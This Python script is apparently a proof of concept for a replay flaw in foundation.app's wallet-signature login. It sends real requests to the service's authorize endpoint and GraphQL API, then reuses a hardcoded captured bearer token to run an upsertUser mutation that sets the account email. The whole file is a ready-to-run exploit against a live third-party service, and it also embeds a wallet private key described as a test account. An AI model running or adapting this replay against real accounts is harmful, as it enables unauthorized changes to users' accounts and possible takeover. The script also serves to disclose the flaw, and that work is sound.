from curl_cffi import requests
from eth_account.messages import encode_defunct
from eth_account import Account
import json
import base64
import time

# A test account. Never send eths to this account!
# In the real world, the private key is stored in the user's crypto wallet, and the attacker can't get it.
# Here, we just use a test account to simulate the user's crypto wallet.
PRIVATE_KEY = 'f78411d5886f5ded63cd304b9b56dd87b05ce0922223e87b4927cc56bfaa7b02'
ADDRESS = '0x36E7C6FeB20A90b07F63863D09cC12C4c9f39064'


def sign_msg(msg, private_key = PRIVATE_KEY):
    '''
    Sign message with private key
    This function mocks the user signing the message with the crypto wallet.
    '''
    msg = encode_defunct(text=msg)
    account = Account.from_key(private_key)
    sig =  account.sign_message(msg)
    return sig.signature.hex()

def request(payload):
    '''
    Request to the server
    This function mocks the explorer sending the request to the server.
    '''
    print('Request payload:')
    print(payload)

    session = requests.Session()
    response = session.request(**payload)

    print('Response code:', response.status_code)
    print('Response text:', response.text)
    print()
    return response.text



'''
The foundation.app uses the user's signature as the token. Therefore, we directly demonstrate the request to obtain the user's settings page information after obtaining the user's signature (token).
'''
def request_settings(token):

    '''
    'Bearer UGxlYXNlIHNpZ24gdGhpcyBtZXNzYWdlIHRvIGNvbm5lY3QgdG8gRm91bmRhdGlvbi4=.0x5f0cbd5d41583a83ccd700187705ac4bebb14d9d3c54fd1fad21e97ee5b4b7d8436dd93afb443f83dbb43141c6d4b585d82fc116ecbf25fd48f0fd53831054321c'
    '''

    token = 'Bearer '+token

    payload =  {'method': 'POST', 'url': 'https://api.foundation.app/graphql', 'headers': {'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7,en-GB;q=0.6,zh-TW;q=0.5', 'Cache-Control': 'no-cache', 'Content-Length': '879', 'Origin': 'https://foundation.app', 'Pragma': 'no-cache', 'Referer': 'https://foundation.app/', 'content-type': 'application/json', 'Authorization': token}, 'params': {}, 'data': b'{"query":"\\n    mutation UpsertUser($data: UserInput!) {\\n  upsertUser(data: $data) {\\n    ...UserFragment\\n    email\\n  }\\n}\\n    \\n    fragment UserFragment on User {\\n  bio\\n  coverImageUrl\\n  createdAt\\n  isAdmin\\n  moderationStatus\\n  moderationStatus\\n  name\\n  profileImageUrl\\n  publicKey\\n  username\\n  links {\\n    website {\\n      platform\\n      handle\\n    }\\n    instagram {\\n      platform\\n      handle\\n    }\\n    twitter {\\n      platform\\n      handle\\n    }\\n    youtube {\\n      platform\\n      handle\\n    }\\n    facebook {\\n      platform\\n      handle\\n    }\\n    twitch {\\n      platform\\n      handle\\n    }\\n    tiktok {\\n      platform\\n      handle\\n    }\\n    discord {\\n      platform\\n      handle\\n    }\\n    snapchat {\\n      platform\\n      handle\\n    }\\n  }\\n}\\n    ","variables":{"data":{"email":"test@gmail.com","providerType":"METAMASK"}}}', 'timeout': 10, 'impersonate': None}

    print("Request settings...")
    request(payload)



def demo():
    
    # Message
    msg = "Please sign this message to connect to Foundation."
    
    msg_code = base64.b64encode(msg.encode('utf-8')).decode('utf-8') # base64 encoding of the message
    sig = sign_msg(msg) # The user signs the message with the crypto wallet
 
    '''
    The token of the data consists of two parts, the first part is the base64 encoding of the message, and the second part is the signature of the message.
    '''
    token = msg_code+'.'+sig # The token of the data

    data = {"token":token,"connectorType":"WALLETCONNECT"}
    data = json.dumps(data)
    payload = {'method': 'POST', 'url': 'https://foundation.app/api/authorize', 'headers': {'referer': 'https://foundation.app/', 'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'accept': '*/*', 'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7,en-GB;q=0.6,zh-TW;q=0.5', 'cache-control': 'no-cache', 'content-type': 'application/json', 'origin': 'https://foundation.app', 'pragma': 'no-cache'}, 'params': {}, 'data': bytes(data,'utf-8'), 'timeout': 10, 'impersonate': None}

    '''
    We can see the token in the response are same as the token we constructed.
    {"done":true,"token":"UGxlYXNlIHNpZ24gdGhpcyBtZXNzYWdlIHRvIGNvbm5lY3QgdG8gRm91bmRhdGlvbi4=.0x5f0cbd5d41583a83ccd700187705ac4bebb14d9d3c54fd1fad21e97ee5b4b7d8436dd93afb443f83dbb43141c6d4b585d82fc116ecbf25fd48f0fd53831054321c"}
    '''
    print("Request token...")
    request(payload)

    # Here we directly request the user's settings
    request_settings(token)



if __name__ == '__main__':

    demo() # Demo 
    time.sleep(1) # Wait for 1 second

    # Replay attack
    token = 'UGxlYXNlIHNpZ24gdGhpcyBtZXNzYWdlIHRvIGNvbm5lY3QgdG8gRm91bmRhdGlvbi4=.0x5f0cbd5d41583a83ccd700187705ac4bebb14d9d3c54fd1fad21e97ee5b4b7d8436dd93afb443f83dbb43141c6d4b585d82fc116ecbf25fd48f0fd53831054321c'
    request_settings(token) 